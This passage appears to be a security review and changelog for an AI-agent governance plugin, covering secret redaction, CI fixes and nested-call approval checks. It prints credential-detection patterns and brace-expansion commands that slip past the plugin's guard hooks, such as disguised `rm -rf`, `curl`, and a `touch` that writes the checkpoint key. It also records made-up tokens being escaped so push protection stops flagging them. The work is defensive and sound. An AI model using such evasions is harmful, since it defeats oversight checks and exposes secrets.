  string), `&`'s, `+`'s, `<`'s, `=`'s and `>`'s (either hex case) as the
  character, and `\/` as `/`, in one pass (the shell's `sed` substitutions
  produce nothing a later one reads, so they decode the same). The rules
  themselves are unchanged, so the three agree by construction, and an
  escaped prose value passes as prose does
  (`{\u0022token\u0022: \u0022rotate monthly\u0022}`). The URL rule takes
  escaped slashes in the shell too.
- Fix, registered values (`encoded_forms`, `encodedForms`): the HTML-safe
  JSON forms are added, by each of three encoders: Go's `encoding/json`
  (`&<>`, the JSON of kubectl, docker, gh and terraform), Gson (`&<>='`,
  the verifier's `=` sibling: base64 padding) and .NET's System.Text.Json
  (`&<>'+"` and a backtick, every character past ASCII), each in lower-case
  and upper-case hex, and each escaped again; the lists stay in the same
  order in both languages (the pinned list gains .NET's four forms of its
  `"` and `é`, a lone surrogate's list gains its upper-case escapes).
- Sibling (verifier): the plugin hook's persist check decoded one JSON
  level; the scan now decodes the escapes above itself, wherever it runs.
- Tests: vectors `url_userinfo_escaped_slashes`, `quote_json_escapes` (an
  assignment, an Authorization header and a HAR pair, all `\u0022`),
  `equals_json_escape`, `token_after_quote_escape` and
  `registered_value_html_safe` (Go, Gson and .NET forms) in `redact.json`;
  `url_userinfo_escaped_slashes`, `quote_json_escape_assignment`,
  `quote_json_escape_authorization`, `equals_json_escape`, the control
  `quote_json_escape_prose` and `registered_value_html_safe` in
  `credentials.json`; `test_a_registered_value_is_replaced_as_html_safe_encoders_write_it`
  (Python, four forms) and the same four in `redact.test.ts`; the runner
  test above (the PHP DSN and the .NET body) and
  `test_a_registered_value_go_escaped_in_a_host_error_is_kept_nowhere`
  (the verifier's terraform error, kept in no record); new 1 MB shapes
  (`\u0022`, `password\u0022:\u0022a `, `[\u0022token\u0022, \u0022`,
  `a:\/\/b:`, `token\u003d`, `\/`) in both SDKs and the shell scan.

#### 3. Common credential formats and the plugin's own keys were not recognised (low); siblings: the audit skill's hook, the log hook's tool names, the project's checkpoint key

- Fix (`redaction.py`, `redact.ts`, `secret_scan.sh`): service tokens by
  their prefix are redacted and refused: Stripe's `sk_live_`/`rk_live_`
  (and `_test_`), Google's `AIza`, GitLab's `glpat-`, npm's `npm_`,
  Vault's `hvs.`/`hvb.`/`hvr.`, SendGrid's `SG.x.y`, and a Slack webhook's
  path; a `.netrc` entry's password (`machine|login|account|default`, at
  most one word, `password`, the value; refused at 8 or more characters
  mixing letters and digits, so `login failed: password reset required`
  passes); and `account`, `signing`, `encryption`, `hmac` and `master` keys
  and `credential` join the credential names in the three and in
  `hooks/secret_member.jq` (so `AccountKey=`, `AUDIT_HMAC_KEY=`,
  `{"accountKey": ...}` and `{"credential": ...}` are read; `credentials`
  is not a name: `{"credentials": "include"}` stays). A presigned URL's
  `X-Amz-Credential=` value is now replaced whole, not its access key id
  alone (`tests/test_idempotency.py` pins the new form).
- Fix, the plugin's own keys (§6.7: a host SHOULD at least recognise the
  credentials it holds itself): the shared scan's `secret_lines` (and so
  `secret_in`) refuses a text holding `AUDIT_HMAC_KEY`'s value (4
  characters or more, as written; `secret_held`), wherever the scan runs:
  the pre-tool-use hook's persist check, the persist skill's hook, the
  audit skill's `Bash` hook (the verifier's sibling: a record holding the
  key was appended) and the log hook's tool and skill names (a name
  holding it is written `[REDACTED]`). The pre-tool-use hook also sets
  `SECRET_HELD` to the project's checkpoint key, `<git dir>/acs/checkpoints/key`
  (64 hex digits, a regular file, in a git directory git made), for a
  persist tool's data; where git cannot say where the project's git
  directory is, none is read, as the take hook could have drawn none there.
- Not read (stated in SECURITY.md §1.5 and both docstrings): npm's
  `_auth=` and a Docker configuration's `auth` member (names too common to
  read alone: `{"two_factor_auth": "enabled"}` would be refused), a name
  ending in `_pass` (`{"pass": 12}` in a test report would be), other
  vendors' formats, a value after `Cookie:` with no `name=` for the refusal
  rule; a host registers such a credential it holds (`Redactor([...])`,
  `configureLayer({ secrets })`).
- Tests: vectors `netrc_password`, `service_tokens`,
  `more_credential_names` and `more_credential_members` in `redact.json`;
  `netrc_password`, the control `netrc_prose`, `account_key`,
  `hmac_key_assignment`, `stripe_key`, `google_api_key`, `gitlab_token`,
  `slack_webhook` and `credential_member` in `credentials.json`; the runner
  test above (netrc, Azure, Stripe); `tests/test_pretooluse_hooks.py`
  `test_the_audit_key_a_todo_would_store_is_refused` (three todos, F504,
  the key not in the refusal; stored under another key) and
  `test_the_checkpoint_key_a_todo_would_store_is_refused` (refused; another
  64-hex value and a key file that is not one stored);
  `tests/test_skill_hooks.py`
  `TestAuditCommandHook::test_blocks_a_record_holding_the_audit_key` (sh
  and bash); `tests/test_hooks_unit.py`
  `test_a_tool_name_that_holds_the_audit_key_is_redacted`.

#### Old code

Against da18a8f's `redaction.py` (copied in place, then restored), 86
Python tests fail: the new vectors, the refusal and layer cases built from
them, the HTML-safe forms and the runner tests. Against its `redact.ts`, 57
TypeScript tests fail (the timing tests left out: the old patterns read the
new blank-run shapes in time growing with the square). Against its
`secret_scan.sh`, pre-tool-use hook and audit skill, 47 shell and hook
tests fail: 18 text vectors under sh and bash, the three audit-key todos,
the checkpoint key, the hook-adapter agreement on the vectors and six
audit-record cases; against its log hook, the tool-name case.

#### Documentation

SECURITY.md §1.5 (a bullet on cookies, other encoders' escapes, service
tokens and the plugin's own keys, with what is not read; the timing bullet:
the cookie name's bound and the blank runs); `hooks/README.md` (the
pre-tool-use hook's held keys, the scan's `secret_decoded` and
`secret_held`, the cookie name's bound); the redactors' docstrings; the
package README's `redact` row and the Standard Agents guide's
`encodedForms` line; CHANGELOG [Unreleased] Upgrading (one entry for the
three SDK-facing changes, the broader redaction and the plugin's held
keys). The Standard's text was not changed: §6.7 names a session cookie and
a credential in a header among secrets, leaves the recogniser to the host,
and asks a host to recognise at least the credentials it holds itself,
which the plugin now does.

#### Checks after batch 6

- Python: `pytest tests/` file by file in runs of at most 150 tests (40 for
  `test_skill_hooks.py` and `test_pretooluse_hooks.py`, 8 for
  `test_redaction.py`, whose timing tests read 1 MB each), each under
  `timeout 120` and a 4 GB address-space limit: 8221 passed, 19 skipped, 1
  failed (`test_idempotency.py`'s pinned `X-Amz-Credential=` form, the
  broader redaction of #3; updated, the file passes). ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the five generators'
  `--check`; `scripts/run_conformance.py`.
- Agreement: 4000 generated texts (fragments of cookies, quotes and their
  escapes, schemes, options, tokens, non-ASCII) give the same redaction and
  the same refusal, as text and as data, in Python and TypeScript, and the
  same `encoded_forms`; 500 of them with no line break give the shell
  scan's verdict the Python one.
- Timing: the Python redactor is about 1.6 times slower on a megabyte than
  before (more rules, and starts after an escaped quote); the slowest 1 MB
  shape took 10.8 s of the test's 20 s here, under load, where the old
  patterns took 6 s for the same test; every new shape is linear (50 and
  100 KB timed). The shell scan decides 200 KB of each new shape in 0.4 s,
  and finds a held key in 1 MB in 0.5 s.
- Rust: no Rust source changed; not rebuilt.
- TypeScript: the package's build, check and test (2169 passed); the
  binding's check and test (293 passed, 2 skipped).
- Old code: as listed above (86 Python, 57 TypeScript and 48 shell and hook
  tests fail on da18a8f's files, copied in place, then restored).
- No CLI or nested agent was started; the scratch outputs were removed.

## After the loop: push protection

The merge of the loop into the integration branch was refused at the push:
the host's secret scanning (push protection) found three example tokens in
a provider's own format in the secrets vectors, added in round 4 batch 5
and round 5 batch 6: a Discord bot token (`authorization_bot`,
`authorization_other_schemes`), a Stripe live key (`stripe_key`,
`service_tokens`) and a Slack webhook URL (`slack_webhook`,
`service_tokens`). They are made up, but a public file holding them would
also reach the providers' programs that revoke tokens found in public code.

- **Fix:** the loop's commits were rewritten before anything was pushed, so
  that each of those tokens is written with one character as a JSON `\u`
  escape (`.` for a dot, `_` for an underscore). Every reader
  (`json.load`, `JSON.parse`, `jq`) decodes it, so the vectors test the same
  text: in each of the 35 rewritten commits, every changed file decodes to
  the same JSON value as before, and no other file changed.
- **Record:** both files' `description` says why the escape is there.
- **Test:** `test_the_vector_files_hold_no_raw_provider_token`
  (`tests/test_redaction.py`) fails when either file's raw text holds one of
  the three shapes, and when the decoded vectors no longer hold each of them.
  It fails on the files as they were.

## After the loop: CI on a newer runner

The pull request's Python job failed the same 9 tests on Python 3.14 and
3.15 on GitHub's ubuntu-latest of November 2026, all of which passed where
the loop ran. The runner differs in three ways.

- **JSON nested 100 000 levels deep parses there.** Python's json C decoder
  raises RecursionError on `"[" * 100_000 + "]" * 100_000` or returns the
  nested lists, according to the C stack size. Where it returned them, the
  checkpoint archive handed a line's list to `Checkpoint.from_dict`, whose
  AttributeError the reader did not catch (the archive could not be read),
  and `IdempotencyLog` called `entry.get` on it. **Fix:** a line or file
  that parses to anything but what its reader writes (a list, a number, a
  string, null, an object short of a member the reader needs) is read as
  one that does not parse: `Checkpoint.from_dict` raises ValueError for a
  non-object; `IdempotencyLog` checks each entry's members (`_read_entry`)
  and reads any other line as a torn last line or, anywhere else, a
  ValueError. The audit of every other `json.loads` of file content in
  `grounded_agency/` found two more: a `MemoryStore` file (a non-object or a
  row short of a member raised AttributeError, TypeError or KeyError, and a
  deep file RecursionError) and a snapshot manifest (a deep one raised
  RecursionError out of a restore, and an entry without its mode stopped a
  restore part way, after files before it were put back; an entry's
  `sha256`, a path under `objects/`, could name a file outside the store).
  Both are a ValueError now, the manifest's before anything is restored.
  The evidence stores (`EvidenceRecord.from_dict`), the tracker's state
  file and the project settings reader already checked. **Test:** the
  tests that read the deep text take `deep_json` (`tests/conftest.py`),
  which makes `json.loads` raise RecursionError on it or return what it
  parses to, so each runs both ways on any machine; the premise test holds
  on any runner (the installed decoder does one of the two); non-object
  lines (`[1]`, `3`, `"x"`, `null`, objects short of a member) for the
  archive, the idempotency log, the evidence store, the memory file and the
  manifest. They fail on the code as it was.
- **jq 1.8 parses deeper input than jq 1.7.** The runner's jq accepts the
  253- and 300-level calls jq 1.7 refuses at 256 levels (it refuses past
  10 000), so the log hook parsed and logged them, as it should; the test
  assumed jq 1.7's limit. **Fix (test only):**
  `test_a_call_nested_past_jqs_limit_is_reported` asks the jq on `PATH`
  whether it parses each call (`_jq_parses`) and expects the call logged
  when it does and reported (exit 1, jq's depth message, no log) when it
  does not; 200 levels, which every jq parses, and 100 000, which every jq
  refuses, keep both paths tested whatever jq runs.
- **Bash 5.3 expands some brace groups otherwise than bash 5.2.** Bash 5.2
  reads a group as a list when a comma is anywhere in it, nested included,
  and keeps a group with no comma that is no sequence as written; bash 5.3
  reads a group as a list only when a comma is at its own level, and of a
  group that is neither keeps the `{` as written and expands what follows
  it: `{a..b{c,d}}` is `a..bc a..bd` to 5.2 and `{a..bc} {a..bd}` to 5.3
  (the runner's bash; its source was not at hand, so the 5.3 rule is the
  best reading of that evidence). The readers (the records guard's bash
  functions, the send and audit skills' jq) gave 5.2's words only, and the
  hooks run under whichever bash the user has: on bash 5.3,
  `touch {x..y{a..b}}/key` with a shipped link `{x..ya}` to the git
  directory's `acs/checkpoints/` writes the checkpoint key, and was asked.
  **Fix:** each reader gives both versions' words: two whole passes, a mode
  through `brace_expand` (bash `BRACE_MODE`, jq `$v`), never a branch per
  group. In bash the second pass runs only when the first met a group 5.3
  reads otherwise (`BRACE_SPLIT`; with none it is the first again), both
  charged to `BRACE_LEFT`, `RESOLVE_LEFT` and `BRACE_SCAN_LEFT`, and words
  that differ are merged by `sort -zu`; jq's `brace_words` returns the
  first pass's list when the two agree, else their union, null past 256
  words together or when either pass is. Both SKILL.md copies are the
  same. A model of both rules in Python (bash 5.2's from its `braces.c`,
  matching the installed bash 5.2 on 13 549 random words) gave the bash
  reader's words for 8 549 random words (499 of them read differently by
  the two versions) and the jq reader's for 5 604 (612; no number
  sequences, which jq writes as one placeholder). Nothing else in `hooks/` or `skills/` expands braces: the
  rollback skill and `shell_words.jq` refuse or flag any unquoted brace,
  and the SDK mapper's `_brace_expansion` only detects a group, which both
  versions close alike. **Test:** `tests/brace_readings.py` lists words the
  versions read differently with each version's words (`p{a..b{c,d}}q`,
  `{a..b{c,d}}z{e,f}`, `{ab..c{d,e}}`, `{x..y{a..b}}`, ...); the readers
  must give the union of both, which must hold the installed bash's, and
  exactly the installed bash's words for every other word of `BRACE_CASES`
  and `BRACE_WORDS`; each pass on its own gives its version's words of the
  listed ones and the same words as the other on every other word;
  `test_a_records_path_one_bash_version_builds_is_refused` refuses the
  link route above (asked before) and its 5.2 twin.
  The review below found that one word cannot tell two readings of bash
  5.3 apart; the readers now give both, with no `sort`.

## After the loop: review of the CI fixes

An independent review of the commit above reported five findings; each was
reproduced first.

- **The bash 5.3 rule rested on one word that two readings give** (medium).
  Reading A keeps a group's `{` and expands all that follows it (the rule
  above); reading C keeps the group's two braces around the words of its
  own text, then expands the text after it. A model of each gives the same
  words for all 50 test words, so a runner with bash 5.3 passed whichever
  is real; on generated words C makes words that are neither 5.2's nor
  A's, and on bash 5.3 read as C, `touch {{..c}..{}{{b..b}}},}/key`
  through a shipped link `{{..c}..{}{b}},}` to `acs/checkpoints/` writes
  the key and was asked. **Fix:** both readers give the words of three
  readings, 5.2, 5.3a and 5.3c (bash `BRACE_MODE`, jq `$v`), the last two
  only for a word whose 5.2 pass met a group 5.3 reads otherwise; the docs
  say the 5.3 rule is inferred and that both readings are read. **Test:**
  `tests/brace_readings.py` holds each reading's words of each word, words
  that tell 5.3a and 5.3c apart included (`{a..b{c}},d}`, `{..{}},}`,
  `{{,}..{}},}`, `{{..c}..{}{{b..b}}},}/key`); each pass gives its
  reading's words; the readers give the words of all three;
  `test_the_installed_bash_reads_as_one_reading` requires the installed
  bash to give one reading's words of every listed word (5.2 here; on a
  runner with bash 5.3 it shows 5.3a or 5.3c, or fails if neither);
  `test_a_records_path_one_bash_version_builds_is_refused` refuses the
  link routes that only 5.3a (`{a..bd`) and only 5.3c build. The bash and
  jq passes matched the models of the three readings, and the 5.2 model
  the installed bash, on 9 788 random words.
- **A sequence's sign and long increment were kept as written** (medium,
  older than the commit). Bash takes a `+` and any number of digits in a
  sequence's terms (`expand_seqterm`: `strtoimax`), so `.cl{a..a..+1}ude`
  and `.cl{a..a..1000000000}ude` are `.claude`; the guard's patterns took
  `-?[0-9]{1,9}` and the skills' jq `-?[0-9]+`, so `rm -rf
  .cl{a..a..+1}ude` was asked and `c{u..u..+1}rl` ran past the send skill's
  name gate. **Fix:** both readers take `[+-]?[0-9]+` for every term, an
  increment's value as bash uses it (its sign ignored, 0 as 1), and a
  letter sequence's step in jq (it gave every letter of the range); a
  sequence with a number of more than 9 digits, or an increment of more
  than 18, leading zeros aside, is not read (bash 5.2 prints a zero-padded
  number as a 32-bit int, `{05000000000..05000000001}` as `00705032704`,
  refuses one past 64 bits, and another version may do otherwise): the
  guard's call is refused, the jq reader gives null. **Test:** signed,
  padded and long-increment sequences in `BRACE_CASES` and `BRACE_WORDS`
  (exactly the installed bash's words); the two `rm -rf .cl{a..a..}ude`
  forms refused; the send hook blocks `c{u..u..+1}rl` and
  `c{u..u..1000000000}rl`; the long numbers refused or null.
- **`_is_manifest` did not check a manifest's paths or `expires_at`**
  (low). A path with a NUL stopped a restore part way (ValueError from the
  system call, after the files before it were put back), one with a lone
  surrogate raised UnicodeEncodeError, and an `expires_at` with no offset
  TypeError. **Fix:** a manifest path must be one capture records
  (`_is_captured_path`: no NUL, an exact UTF-8 form, no empty, `.` or `..`
  part, so neither an absolute path nor `src/../.git/config`, which passed
  the restore's check of names it never writes), and `expires_at` null or
  a time with its offset (`_aware_time`, which the restore uses too).
  **Test:** those manifests are malformed before anything is restored;
  the restore of a captured manifest with a NUL or surrogate path added, or
  a naive expiry, puts nothing back.
- **`MemoryStore` loaded rows persist never writes** (low). A time past
  the range a date-time states (1e300, 2**70) loaded and a recall raised
  OverflowError; data nested 5 000 or 20 000 levels (which the runner's
  decoder parses) loaded and a recall raised RecursionError from its copy.
  **Fix:** a row's times must lie from 0001-01-01T00:00:00.000Z to
  9999-12-31T23:59:59.999Z, and its data be what persist stores: I-JSON
  at most 100 levels deep, checked by the core's canonical form (no
  recursion in Python), as persist checks it. **Test:** those rows,
  NaN and Infinity, and an integer past 2^53 are malformed; data 100
  levels deep and the two end times read back.
- **The guard forked `sort` for each word the readings expand
  differently** (low). No budget counted it: 511 words `{..{,}}` took
  4.18 s (1.07 s before the commit). **Fix:** the readings' words are
  merged in bash: a reading adds its words unless one before it made the
  same words in the same order (compared joined by `\001`, which no word
  holds once its marks are read back), so no process is started and every
  pass is charged to the budgets. The same call takes 3.33 s (three
  passes); 16 strings of 4 090 bytes to an MCP tool, refused over budget,
  3.92 s (3.42 s before the commit, 8.94 s with `sort`).

## Round 6: the Standard Agents binding and the TypeScript package

Issue #142, decision 23 (b): rounds run by layer group as open pull
requests land, and convergence is counted per group. This round's group
is the one no open pull request touched on 2026-11-27: the Standard Agents
binding (`examples/standard_agents/src/acs/`) and the TypeScript package
code it calls (`packages/acs-core/src/`: `binding.ts`, `destinations.ts`,
`canonical.ts`, `ijson.ts`, `flags.ts`, and `redact.ts` as the binding
applies it). The redactors' pattern tables, the SDK adapter and the
plugin's hooks wait for #147, #148 and the sandbox pull requests.

### Method

This round did not run the method of rounds 1 to 5. One reviewer read the
group's code and ran each of the six lenses below, and reproduced each
finding on 8ec818c2 (origin/main) with a test in the binding's or the
package's vitest suite. There were no separate finders and no independent
verifier per finding. The dependencies of the binding's suite were taken
from the npm cache and checked against the integrity hashes of its
`package-lock.json`, not installed with `npm ci`.

The six lenses, and what each probed:

1. **Approval timing.** Whether a composite's decisions are checked at the
   nested call for every nested call that needs approval: the expiry at
   that moment, a person requirement, flags the profiles raise.
2. **Composites and nesting.** Nested calls that take no token (arguments
   the runtime validates), plain and grounded nested tools, a nested call
   two composites deep.
3. **Profiles and effective flags.** Where the flags the profiles raise
   are applied: the composite's own call, a nested call, the lint's F506
   and V102.
4. **Records and diagnostics.** What a grounded or control tool returns or
   throws to the runtime, and how the audit hook links trace entries to
   tool call ids.
5. **Binding records.** `checkBindings`, `annotationRecord` and the lint
   with tool names that a plain object answers from its prototype.
6. **Secrets as the binding applies them.** Credentials in member names of
   `persist` data and of a refusal's diagnostic, and the argument digest.

| Reported | New | Confirmed | High | Medium | Low |
|---|---|---|---|---|---|
| 7 | 6 | 4 | 0 | 3 | 1 |

The group has not converged: this round confirmed three new medium defects.

### 1. A nested call was not held to the flags the composite's profiles raise for it (medium)

A composite's profiles raised the composite's own flags for what its nested
calls perform (§5.21.3), but the nested call was checked with its own flags
only. `invokePlain` checked the composite's decisions against a plain
tool's approval only when the binding record required approval, and
`check` used the grounded tool's own flags, which include the profiles
given to that tool and the layer's, not those given to an enclosing
composite. §5.18.4 covers a nested call only by decisions the composite's
call counted that meet the nested call when it runs, and §5.21.3 makes a
profile given to a composite govern the calls its approval covers.

- Probe: `block_autonomous: ['persist']` given to `batch` (invoke, its
  approval valid for one minute), which invokes `store` (persist, no
  approval of its own). A person approves `batch`; `batch` runs 55 s
  later and invokes `store` 10 s after that. `store` ran on the lapsed
  approval as a plain tool, as a grounded tool, with the profiles put in
  force by the layer (plain tool), and two composites deep (both kinds).
  It was refused (F502) only where `store` was given the profiles itself.
  With the arguments validated by the runtime (a zod `.default`), the
  nested grounded call took no token and ran with no approval at all,
  though the profiles require a person's.
- Fix (`grounded.ts`): each nesting token, and the composite's nesting
  state, carries the profiles the composite applies (its own and the
  layer's) and those of the composites enclosing it. `pendingRules`
  returns them with the other rules, and `check` raises the call's flags
  and person requirement with them (`raisedBy`) before coverage, approval
  and the checkpoint are decided, whether or not the call takes the token.
  `invokePlain` raises a plain tool's flags the same way: a raised approval
  is covered only by the composite's decisions that still meet it
  (`decisionsCover`), a raised person requirement only by a composite
  whose decisions were all a person's, and a checkpoint only when the
  composite's call used one. A covering composite passes on whether its
  decisions were all a person's (`personAuthority`), so the coverage of a
  call two levels down is decided on the decisions that covered it.
- Python: the SDK adapter does not see nested calls (its statement), so it
  has no sibling.
- Tests: `profiles.test.ts` "a nested call needs the composite's
  decisions valid when the profiles raise its approval" (seven placements,
  each refused after the lapse and covered while the approval is valid)
  and "the flags a composite's profiles raise reach a nested call that
  takes no token" (a person is asked; control: the unchanged arguments
  are covered), and "a plain nested call under a composite that took no
  token is held to the outer composite's profiles" (`outer`, with the
  profiles, invokes `middle`, whose arguments the runtime validates, which
  invokes the plain `store`: refused F502 when the profiles require a
  person's approval and F501 when they require a checkpoint; controls:
  `middle` takes the token). On 8ec818c2's `grounded.ts` 8 of the 20 tests
  fail; the controls and the two placements that were already checked
  pass.

### 2. A control tool's thrown error reached the runtime unredacted (medium)

The thrown path of round 5 batch 5 #1's control-tool sibling: `controlTool`
redacted the error result its code returned, but an error its code threw
passed to the runtime, the thread's messages and the model as thrown, with
a registered secret or a token in it (§6.7).

- Fix (`grounded.ts`): `controlTool` catches what its code throws and
  returns it as an error result, redacted with the default patterns and the
  layer's secrets, as a grounded tool returns its own code's error. The
  call's entry is still `executed`: a control tool is never refused.
- Tests: `evidence.test.ts` "returns a control tool's thrown error as a
  redacted error result" (a database URL with a registered password and a
  GitHub token). It fails on 8ec818c2's `grounded.ts`.

### 3. `checkBindings` read tool names from the prototype of a plain object (low)

`checkBindings` and the lint read the loaded bindings with
`effective[name]`, so a tool offered or tied to a host action under
`constructor`, `toString`, `hasOwnProperty` or `__proto__`, whose record
did not load, found a function or `Object.prototype`: the check threw
(`tool.capabilities is not iterable`) where the Python loader reports W617
or F506, and a record whose `tool` is `__proto__` set the prototype of the
bindings returned instead of being among them. It fails closed (the lint
throws, and `groundedTool` throws while it defines a composite that lists
such a name), so it is low.

- Fix: `binding.ts` reads `effective`, `known` and `raised` by own members
  only and sets each binding as an own member; `lint.ts` sets `offered`,
  `raised` and the host actions' names as own members and reads a tool's
  annotation by an own member; `invokedBinding` in `grounded.ts` reads the
  loaded binding by an own member.
- Python: the loader keeps bindings in dicts, which answer no name they do
  not hold, so it has no sibling.
- Tests: the package's `bindings.test.ts` "tool names a plain object holds
  on its prototype" (W617, F506, a loaded `__proto__` binding, V107 for
  each of the four names; a control); the binding's `grounded.test.ts`
  "reports a tool named for a member of a plain object, whose annotation
  does not load" (W617 and F506 for three names). On 8ec818c2's
  `binding.ts` 9 of the 17 package tests fail; on its `binding.ts` and
  `lint.ts` the binding's test fails.

### 4. The audit hook gave a model's call id to a nested call's entry (medium)

An entry a nested call wrote waited for a tool call id as a top-level
call's does. Whether a runtime fires `tool_call_done` for
`state.invokeTool` is not stated by the Standard Agent Specification
(0.2.0; `@standardagents/spec` 0.45.10 says only that the hook "fires once
per tool call"). In a runtime that fires none for an invocation, the hook
of the model's direct call of the same tool later in the step took the
oldest finished entry of that name, the nested one: the nested call's
record carried the direct call's id, and the direct call's own entry kept
none (§6.4: a record names the call that produced it).

- Probe: `gather` (integrate) invokes `fetch` (retrieve) with `{n: 1}`;
  the model then calls `fetch` with `{n: 2}` in the same step. With no
  hook for the invocation, the hook of the direct call linked `c2` to the
  nested entry and left the direct entry unlinked. The same with
  `fetch`'s arguments validated by the runtime, so that the nested call
  took no token.
- Fix (`records.ts`, `grounded.ts`, `audit.ts`): an entry written through
  a composite's state, a nested call's, or a call made while the
  composite's invocation of the tool was pending (`pendingUnder`, for a
  nested call that takes no token), records the composite's `seq`
  (`under`) in the list of entries waiting for a call id. Such an entry
  waits only while the composite's own entry waits, at any depth
  (`withoutOrphans`): once the composite's hook has linked it, the nested
  entry keeps no call id, and a later call of the same tool takes its own
  entry. A runtime that does fire the hook for an invocation fires it
  while the composite runs, so the nested entry is still linked to it.
- Limit: the rule relies on the order the rest of the matching relies on,
  the calls of a step running one after another with each hook before the
  next call (Tools §9). A hook of the model's own call delivered while a
  composite's entry still waits would still take a finished nested entry
  of the same tool.
- Python: the SDK adapter's records come from its own hooks, which do not
  see nested calls, so it has no sibling.
- Tests: `evidence.test.ts` "the audit hook links a nested call only while
  its composite waits" (no hook for the invocation; the same with the
  nested call taking no token; control: the runtime fires the hook for the
  invocation and it is linked to the nested entry). On 50167f14's
  `audit.ts`, `grounded.ts` and `records.ts` the first two fail and the
  control passes.

### Reported and not confirmed

- **A covered nested call is not held to the checkpoint's age at the
  nested call, nor to the nested tool's `checkpoint_max_age_ms`.** Not a
  defect: §5.18.4 applies "no further checkpoint when that call used one".
- **F506 for a stop tool that can be refused for a destination or a
  secret.** Not a defect: §5.18.3 and the code table define F506 by
  unbound, a prerequisite, or an effective `requires_checkpoint` or
  `requires_approval`.
- **The argument digest of a call whose arguments hold a secret.** A
  duplicate: round 1 batch 7 checked it (the digest is of the whole
  arguments, which §6.7 allows).
- Probed and clean: a credential in a member name of `persist` data or of
  a refusal's diagnostic is refused and redacted (`holdsCredential`,
  `redactJson`).

### Documentation

The Standard Agents guide (the secrets bullet: a control tool's thrown
error; "Rules that reach a nested call without a token": the raised flags
and person requirement; "A tool is not told which call it is serving":
a nested call's entry), and the `profiles` option's comment in
`grounded.ts`. `spec/SECURITY.md` §5.5 and `CHANGELOG.md` are edited by
open pull requests and are left to the wave-2 pass that edits §5.5 once.

### Checks after the batch

- TypeScript package: `npm run build:wasm` (toolchain 1.99.1), `npm run
  build`, `npm run check`, `npm test` (2186 passed).
- Binding: `tsc --noEmit`, `vitest run` (311 passed, 2 skipped).
- Old code: the new tests against 8ec818c2's `grounded.ts`, `lint.ts` and
  `binding.ts`, copied in place and then restored: 8 of 18 binding tests
  and 9 of 17 package tests fail; the controls pass.
- No Python, Rust, hook or skill file changed, so the Python suite, the
  Rust checks and the hook tests were not run.
